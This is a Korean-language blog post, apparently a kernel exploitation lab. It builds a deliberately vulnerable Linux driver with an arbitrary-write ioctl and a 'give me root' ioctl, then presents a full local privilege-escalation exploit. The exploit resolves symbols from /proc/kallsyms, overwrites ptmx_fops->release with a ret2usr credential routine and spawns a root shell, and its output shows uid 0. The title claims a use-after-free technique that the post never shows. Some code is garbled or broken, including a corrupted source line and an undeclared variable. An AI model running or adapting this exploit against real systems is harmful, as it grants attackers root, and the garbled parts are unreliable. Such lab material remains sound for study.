---
title: Use After Free with tty struct
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, use after free]
math: true
mermaid: true
---

## Description

공격자가 bof를 통해 임의의 위치에 임의의 값을 쓸 수 있다.

## Set environment

chardev_ioctl() 함수의 switch 분기문에 IOCTL_WWW를 추가한다. chardev_ioctl() 함수의 세번째 인자값(arg)을 ioctl_www_arg 구조체로 형변환하여 para 변수에 값을 저장한다.

```c
// chardev.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
    
#include "chardev.h"
MODULE_LICENSE("Dual BSD/GPL");
    
#define DRIVER_NAME "chardev"
        
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 1;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;
    
static int     chardev_open(struct inode *, struct file *);
static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static long chardev_ioctl(struct file *, unsigned int, unsigned long);
    
struct file_operations s_chardev_fops = {
    .open    = chardev_open,
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .unlocked_ioctl = chardev_ioctl,
};
    
static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    int minor = 0;
    dev_t dev;
    
    printk("The chardev_init() function has been called.");
        
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);
    
    //initialize a cdev structure
    cdev_init(&chardev_cdev, &s_chardev_fops);
    chardev_cdev.owner = THIS_MODULE;
    
    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
    
    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
    
    device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, "chardev%d", minor);
    return 0;
}
    
static void chardev_exit(void)
{
    int minor = 0;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
        
    printk("The chardev_exit() function has been called.");
    
    device_destroy(chardev_class, MKDEV(chardev_major, minor));
    
    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}
    
static int chardev_open(struct inode *inode, struct file *file)
{
    printk("The chardev_open() function has been called.");
    return 0;
}
    
static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_close() function has been called.");
    return 0;
}
    
static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_write() function has been called.");
    return count;
}
    
static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_read() function has been called.");
    return count;
}
    
static struct ioctl_info info;
static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct ioctl_www_arg *para;
    printk("The chardev_ioctl() function has been called.");
    
    switch (cmd) {
        case SET_DATA:
            printk("SET_DATA\n");
            if (copy_from_user(&info, (void __user *)arg, sizeof(info))) {
                return -EFAULT;
            }
        printk("info.size : %ld, info.buf : %s",info.size, info.buf);
            break;
        case GET_DATA:
            printk("GET_DATA\n");
            if (copy_to_user((void __user *)arg, &info, sizeof(info))) {
                return -EFAULT;
            }
            break;
        case GIVE_ME_ROOT:
            printk("GIVE_ME_ROOT\n");
            commit_creds(prepare_kernel_cred(NULL));
            return 0;
        case IOCTL_WWW:
            para = (struct ioctl_www_arg *)arg;
            *(para->ptr) = para->value;
            return 0;
        
        default:
            printk(KERN_WARNING "unsupported command %d\n", cmd);
    
        return -EFAULT;
    }
    return 0;
}
    
module_init(chardev_init);
module_exit(chardev_exit);
```

```c
// chardev.h
#ifndef CHAR_DEV_H_
#define CHAR_DEV_H_
#include <linux/ioctl.h>
    
struct ioctl_info{
    unsigned long size;
    char buf[128];
};

struct ioctl_www_arg {
    unsigned long *ptr;
    unsigned long value;
};

#define             IOCTL_MAGIC         'G'
#define             SET_DATA            _IOW(IOCTL_MAGIC, 2 ,struct ioctl_info)
#define             GET_DATA            _IOR(IOCTL_MAGIC, 3 ,struct ioctl_info)
#define             GIVE_ME_ROOT        _IO(IOCTL_MAGIC, 0)
#define             IOCTL_WWW           _IOR(IOCTL_MAGIC, 0, struct ioctl_aaw_arg *)
#endif
```

## Proof of concept

IOCTL_WWW 매크로를 호출한다. 임의의 주소에 임의의 값을 덮어쓸 수 있는지 확인한다.

- arg.ptr = 0x4141414141414141
- arg.value = 0x4242424242424242

0x4141414141414141 영역에 0x4242424242424242 값을 덮어쓸 수 있다.

```c
// gcc test.c -o test
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include "chardev.h"

int main(){
    int fd,ret ;
    struct ioctl_www_arg arg;
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
        perror("open error");
        exit(1);
    }
    arg.ptr = 0x4141414141414141;
    arg.value = 0x4242424242424242;
    ret = ioctl(fd,IOCTL_WWW,&arg);
    if(ret < 0){
        perror("ioctl error");
        exit(1);
    }
    close(fd);
}
```

[rax](0x4141414141414141)에 rdx(0x4242424242424242)로 값을 저장하려고 하지만 0x4141414141414141은 사용할 수 없는 영역이라 general_protection 함수가 호출된다.

```
1: x/i $rip
=> 0xffffffffc03f811b:  mov    QWORD PTR [rax],rdx
(gdb) 
0xffffffff817f9030 in general_protection ()
    at /build/linux-lts-xenial-gUF4JR/linux-lts-xenial-4.4.0/arch/x86/entry/entry_64.S:981
981 /build/linux-lts-xenial-gUF4JR/linux-lts-xenial-4.4.0/arch/x86/entry/entry_64.S: No such file or directory.
1: x/i $rip
=> 0xffffffff817f9030 <general_protection>: nop    DWORD PTR [rax]
(gdb) info r rax
rax            0x4141414141414141  4702111234474983745
(gdb) info r rdx
rdx            0x4242424242424242  4774451407313060418
```

### Area to overwrite

앞에서 임의의 영역에 임의의 값을 저장할 수 있다는 것을 확인한다. 공격자는 해당 취약점을 이용해 권한상승을 실행할 수 있는 대상을 찾아야 한다. 다음과 같이 모든 사용자가 읽고 쓸 수 있는 디바이스 파일을 확인한다.

```
bs@bs-virtual-machine:~/Desktop$ find /dev/ -type c -perm -6 2>/dev/null
/dev/chardev0
/dev/net/tun
/dev/ptmx
/dev/fuse
/dev/tty
/dev/urandom
/dev/random
/dev/full
/dev/zero
/dev/null
```

해당 디바이스 파일들 중 struct file_operations를 사용한 변수가 있는지 확인이 필요하다. 리눅스에선 struct file_operations 사용할 경우 "디바이스명_fops" 같은 형태로 변수명을 작성한다. 중요한 것은 2번째 필드이며, 심볼의 유형에 대한 정보이다.

- ‘R’, ‘r’: 읽기 전용 데이터 섹션 사용
- ‘B’, ‘b’: 초기화되지 않은 데이터 섹션(BSS) 사용

즉, 읽고 쓰기가 가능한 fops 구조체 변수는 ptmx_fops 뿐이다.

```
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep tun_fops
ffffffff818a74a0 r tun_fops
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep ptmx_fops
ffffffff81fe3440 b ptmx_fops
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep fuse_fops
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep tty_fops
ffffffff81870dc0 r hung_up_tty_fops
ffffffff81870f80 r tty_fops
```

ptmx 드라이버에 사용하는 ptmx_fops 변수는 const 형태로 선언되지 않았기 떄문에 read, write가 가능하다. 즉, write-what-where 취약점을 이용해 ptmx_fops 변수의 값을 변조할 수 있다.

```c
// /linux/v4.4/source/drivers/tty/pty.c
static str/linux/v4.4/source/drivers/tty/pty.czuct file_operations ptmx_fops;

static void __init unix98_pty_init(void)
{
    ptm_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,
            TTY_DRIVER_RESET_TERMIOS |
            TTY_DRIVER_REAL_RAW |
            TTY_DRIVER_DYNAMIC_DEV |
            TTY_DRIVER_DEVPTS_MEM |
            TTY_DRIVER_DYNAMIC_ALLOC);
    if (IS_ERR(ptm_driver))
        panic("Couldn't allocate Unix98 ptm driver");
    pts_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,
            TTY_DRIVER_RESET_TERMIOS |
            TTY_DRIVER_REAL_RAW |
            TTY_DRIVER_DYNAMIC_DEV |
            TTY_DRIVER_DEVPTS_MEM |
            TTY_DRIVER_DYNAMIC_ALLOC);
    if (IS_ERR(pts_driver))
        panic("Couldn't allocate Unix98 pts driver");

    ptm_driver->driver_name = "pty_master";
    ptm_driver->name = "ptm";
    ptm_driver->major = UNIX98_PTY_MASTER_MAJOR;
    ptm_driver->minor_start = 0;
    ptm_driver->type = TTY_DRIVER_TYPE_PTY;
    ptm_driver->subtype = PTY_TYPE_MASTER;
    ptm_driver->init_termios = tty_std_termios;
    ptm_driver->init_termios.c_iflag = 0;
    ptm_driver->init_termios.c_oflag = 0;
    ptm_driver->init_termios.c_cflag = B38400 | CS8 | CREAD;
    ptm_driver->init_termios.c_lflag = 0;
    ptm_driver->init_termios.c_ispeed = 38400;
    ptm_driver->init_termios.c_ospeed = 38400;
    ptm_driver->other = pts_driver;
    tty_set_operations(ptm_driver, &ptm_unix98_ops);

    pts_driver->driver_name = "pty_slave";
    pts_driver->name = "pts";
    pts_driver->major = UNIX98_PTY_SLAVE_MAJOR;
    pts_driver->minor_start = 0;
    pts_driver->type = TTY_DRIVER_TYPE_PTY;
    pts_driver->subtype = PTY_TYPE_SLAVE;
    pts_driver->init_termios = tty_std_termios;
    pts_driver->init_termios.c_cflag = B38400 | CS8 | CREAD;
    pts_driver->init_termios.c_ispeed = 38400;
    pts_driver->init_termios.c_ospeed = 38400;
    pts_driver->other = ptm_driver;
    tty_set_operations(pts_driver, &pty_unix98_ops);

    if (tty_register_driver(ptm_driver))
        panic("Couldn't register Unix98 ptm driver");
    if (tty_register_driver(pts_driver))
        panic("Couldn't register Unix98 pts driver");

    /* Now create the /dev/ptmx special device */
    tty_default_fops(&ptmx_fops);
    ptmx_fops.open = ptmx_open;

    cdev_init(&ptmx_cdev, &ptmx_fops);
    if (cdev_add(&ptmx_cdev, MKDEV(TTYAUX_MAJOR, 2), 1) ||
        register_chrdev_region(MKDEV(TTYAUX_MAJOR, 2), 1, "/dev/ptmx") < 0)
        panic("Couldn't register /dev/ptmx driver");
    device_create(tty_class, NULL, MKDEV(TTYAUX_MAJOR, 2), NULL, "ptmx");
}
```

다른 fops 구조체 변수는 const 형으로 선언된다.

```c
static const struct file_operations tun_fops = {
    .owner  = THIS_MODULE,
    .llseek = no_llseek,
...
```

### struct file_operations

모듈은 등록될 때 디바이스 번호를 등록하고 이와 함께 file_operations라는 구조체를 커널에 알려준다. 모든 디바이스는 file_operations를 사용해 등록해 준 표준회된 인터페이스를 사용해 입/출력 등 작업한다. 유닉스에서는 디바이스, 네트워크 모두 하나의 파일처럼 동작하도록 되어있는데 이에 따른 함수들이 등록되어 있다. 예를 들어 디바이스로부터 읽기 동작을 원한다면 file_operations에 등록된 read 함수를 통해 읽는다.

이러한 file_operations 역할을 악용하여 권한상승 가능하다. file_operations의 release 영역을 이용해 권한상승 시도할 수 있다. release 영역을 이용하기 위해 해당 변수가 file_operations 구조체의 시작 주소로부터 얼마나 떨어져 있는지 확인해야 한다. release 변수는 file_operations 구조체 내 14번째에 선언된다. 해당 변수 앞에 선언된 변수들은 모두 포인터 변수이기 때문에 사용하는 공간의 크기는 8byte 이다. 즉, ptmx_fops->release의 offset은 0x68(8*13).

```c
// /linux/v4.4/source/include/linux/fs.h
struct file_operations {
    struct module *owner;
    loff_t (*llseek) (struct file *, loff_t, int);
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
    ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
    ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
    int (*iterate) (struct file *, struct dir_context *);
    unsigned int (*poll) (struct file *, struct poll_table_struct *);
    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
    int (*mmap) (struct file *, struct vm_area_struct *);
    int (*open) (struct inode *, struct file *);
    int (*flush) (struct file *, fl_owner_t id);
    int (*release) (struct inode *, struct file *);
    int (*fsync) (struct file *, loff_t, loff_t, int datasync);
    int (*aio_fsync) (struct kiocb *, int datasync);
    int (*fasync) (int, struct file *, int);
    int (*lock) (struct file *, int, struct file_lock *);
    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
    int (*check_flags)(int);
    int (*flock) (struct file *, int, struct file_lock *);
    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
    int (*setlease)(struct file *, long, struct file_lock **, void **);
    long (*fallocate)(struct file *file, int mode, loff_t offset,
            loff_t len);
    void (*show_fdinfo)(struct seq_file *m, struct file *f);
#ifndef CONFIG_MMU
    unsigned (*mmap_capabilities)(struct file *);
#endif
};
```

### Exploit plan

1. 권한 상승을 위한 ret2usr 코드 구현
    - commit_creds(prepare_kernel_cred())
2. 구현된 ret2usr 코드의 시작 주소를 ptmx_fops->release 영역에 덮어씀
3. system() 함수를 이용해 "/bin/sh" 실행

필요한 정보는 prepare_kernel_cred, commit_creds, ptmx_fops->release 영역의 주소이다.

ptmx_fops->release 주소는 0xFFFFFFFF81FE34A8(0xffffffff81fe3440 + 0x68)

```bash
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep ptmx_fops
ffffffff81fe3440 b ptmx_fops
```

### ret2usr

return 주소를 덮어쓰는 것이 아니기 때문에 레지스터의 값의 백업, 복원이 필요 없다.

```c
void get_root(){
    commit_creds(prepare_kernel_cred(NULL));
}
```

### Exploit code

```python
// gcc -static exploit.c -o exploit
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include "chardev.h"

void* (*prepare_kernel_cred)(void *);
int (*commit_creds)(void *);

unsigned long kallsyms_getaddr(const char* str){
    FILE *fp;
    char buf[128];
    char sym[128];
    char addr[32];

    if((fp=fopen("/proc/kallsyms","r")) < 0){
        perror("fopen() error");
    }

    while(fgets(buf,256,fp) != NULL){
        memset(addr,0x0,sizeof(addr));
        memset(sym,0x0,sizeof(sym));
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(str,sym)==0){
            printf("%s : %s\n",sym,addr);   
            return strtoul(addr, NULL, 16);
        }
    }

    if(fclose(fp)<0){
        perror("fclose error");
    }
    return 0;   
}

void get_root(){
    commit_creds(prepare_kernel_cred(NULL));
}
   
int main(){
    int fd,ret ;
    void *ptmx_fops;
    struct ioctl_www_arg arg;
    if((fd = open("/dev/chardev0",O_RDWR)) < 0){
        perror("open error");
        exit(1);
    }
    prepare_kernel_cred = kallsyms_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred <= 0){
        perror("addr error");
    }
    commit_creds = kallsyms_getaddr("commit_creds");
    if(commit_creds <= 0){
        perror("addr error");
    }
    ptmx_fops = kallsyms_getaddr("ptmx_fops");
    if(commit_creds <= 0){
        perror("addr error");
    }
   
    ptmx_fops_release = ptmx_fops + sizeof(void*)*13;
    printf("ptmx_fops release: %lx",ptmx_fops_release);
    arg.ptr = ptmx_fops_release;
    arg.value = (unsigned long)get_root;
    ret = ioctl(fd,IOCTL_WWW,&arg);
    if(ret < 0){
        perror("ioctl error");
        exit(1);
    }
    close(fd);

    fd = open("/dev/ptmx",0);
    close(fd);
    system("/bin/sh");

}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./exploit 
prepare_kernel_cred : ffffffff8109da40
commit_creds : ffffffff8109d760
ptmx_fops : ffffffff81fe3440
# id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [04.Write-what-where(Arbitrary Memory Overwrite)(feat.ret2usr)](https://www.lazenca.net/pages/viewpage.action?pageId=25624658)